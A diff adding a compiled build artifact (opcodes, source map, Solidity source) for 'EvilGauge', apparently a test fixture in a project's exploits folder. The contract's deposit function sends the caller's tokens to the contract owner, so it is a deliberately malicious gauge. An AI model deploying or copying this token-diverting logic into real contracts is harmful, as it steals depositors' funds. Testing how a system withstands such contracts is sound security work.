+    "137": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x64"
+    },
+    "139": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP1",
+      "path": "11"
+    },
+    "140": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP3",
+      "path": "11"
+    },
+    "141": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "ADD",
+      "path": "11"
+    },
+    "142": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP4",
+      "path": "11"
+    },
+    "143": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x20"
+    },
+    "145": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP4",
+      "path": "11"
+    },
+    "146": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "147": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP3",
+      "path": "11"
+    },
+    "148": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP4",
+      "path": "11"
+    },
+    "149": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "150": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SUB",
+      "path": "11"
+    },
+    "151": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "152": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP2",
+      "path": "11"
+    },
+    "153": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "ADD",
+      "path": "11"
+    },
+    "154": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "155": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP3",
+      "path": "11"
+    },
+    "156": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "SWAP1",
+      "path": "11"
+    },
+    "157": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        312
+      ],
+      "op": "DUP8",
+      "path": "11"
+    },
+    "158": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "DUP1",
+      "path": "11"
+    },
+    "159": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "EXTCODESIZE",
+      "path": "11"
+    },
+    "160": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "ISZERO",
+      "path": "11"
+    },
+    "161": {
+      "op": "DUP1"
+    },
+    "162": {
+      "op": "ISZERO"
+    },
+    "163": {
+      "op": "PUSH1",
+      "value": "0xAA"
+    },
+    "165": {
+      "op": "JUMPI"
+    },
+    "166": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "168": {
+      "op": "DUP1"
+    },
+    "169": {
+      "op": "REVERT"
+    },
+    "170": {
+      "op": "JUMPDEST"
+    },
+    "171": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "POP",
+      "path": "11"
+    },
+    "172": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "GAS",
+      "path": "11"
+    },
+    "173": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "CALL",
+      "path": "11"
+    },
+    "174": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "ISZERO",
+      "path": "11"
+    },
+    "175": {
+      "op": "DUP1"
+    },
+    "176": {
+      "op": "ISZERO"
+    },
+    "177": {
+      "op": "PUSH1",
+      "value": "0xBD"
+    },
+    "179": {
+      "op": "JUMPI"
+    },
+    "180": {
+      "op": "RETURNDATASIZE"
+    },
+    "181": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "183": {
+      "op": "DUP1"
+    },
+    "184": {
+      "op": "RETURNDATACOPY"
+    },
+    "185": {
+      "op": "RETURNDATASIZE"
+    },
+    "186": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "188": {
+      "op": "REVERT"
+    },
+    "189": {
+      "op": "JUMPDEST"
+    },
+    "190": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "POP",
+      "path": "11"
+    },
+    "191": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "POP",
+      "path": "11"
+    },
+    "192": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "POP",
+      "path": "11"
+    },
+    "193": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "POP",
+      "path": "11"
+    },
+    "194": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "PUSH1",
+      "path": "11",
+      "value": "0x40"
+    },
+    "196": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "MLOAD",
+      "path": "11"
+    },
+    "197": {
+      "fn": "EvilGauge.deposit",
+      "offset": [
+        307,
+        352
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "11"
+    },
+    "198": {
+      "op": "PUSH1",
+      "value": "0x20"
+    },
+    "200": {
+      "op": "DUP2"
+    },
+    "201": {
+      "op": "LT"
+    },
+    "202": {
+      "op": "ISZERO"
+    },
+    "203": {
+      "op": "PUSH1",
+      "value": "0xD2"
+    },
+    "205": {
+      "op": "JUMPI"
+    },
+    "206": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "208": {
+      "op": "DUP1"
+    },
+    "209": {
+      "op": "REVERT"
+    },
+    "210": {
+      "op": "JUMPDEST"
+    },
+    "211": {
+      "op": "POP"
+    },
+    "212": {
+      "op": "POP"
+    },
+    "213": {
+      "op": "POP"
+    },
+    "214": {
+      "fn": "EvilGauge.deposit",
+      "jump": "o",
+      "offset": [
+        257,
+        359
+      ],
+      "op": "JUMP",
+      "path": "11"
+    }
+  },
+  "sha1": "4ec000da11b44abf09df775b1e67121cdf32279c",
+  "source": "pragma solidity =0.5.17;\n\nimport \"@openzeppelinV2/contracts/token/ERC20/IERC20.sol\";\n\ncontract EvilGauge {\n    IERC20 token;\n    address owner;\n\n    constructor(address _token) public {\n        owner = msg.sender;\n        token = IERC20(_token);\n    }\n\n    function deposit(uint256 amount) public {\n        token.transferFrom(msg.sender, owner, amount);\n    }\n}\n",
+  "sourceMap": "86:275:11:-;;;149:102;8:9:-1;5:2;;;30:1;27;20:12;5:2;149:102:11;;;;;;;;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;149:102:11;194:5;:18;;-1:-1:-1;;;;;;194:18:11;;;202:10;194:18;;;;:5;222:22;;-1:-1:-1;;;;;222:22:11;;;;;;;;;;;;;86:275;;;;;;",
+  "sourcePath": "contracts/exploits/EvilGauge.sol",
+  "type": "contract"
+}
